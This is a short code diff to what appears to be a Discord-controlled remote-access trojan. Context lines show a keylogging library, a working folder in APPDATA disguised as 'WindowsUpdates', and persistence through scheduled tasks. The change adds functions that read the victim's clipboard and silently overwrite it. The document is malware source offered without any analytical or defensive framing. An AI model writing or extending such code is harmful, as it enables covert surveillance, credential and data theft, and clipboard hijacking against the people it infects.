@@ -19,6 +19,7 @@ import imageio
 import pynput
 import discord
 import os
+import pyperclip
 
 operation_dir = os.getenv("APPDATA") + "\WindowsUpdates"
 nullptr = POINTER(c_int)()
@@ -119,3 +120,16 @@ def bootup(): #USING SCHEDULED TASKS
   except Exception as e:
     print(e)
     return "Error creating task."
+
+def get_clipboard():
+  clipboard = pyperclip.paste()
+  if clipboard == "":
+    return "Clipboard is empty."
+  elif len(clipboard) > 5999:
+    return "Clipboard is too long."
+  else:
+    return clipboard
+
+def set_clipboard(text):
+  pyperclip.copy(text)
+  
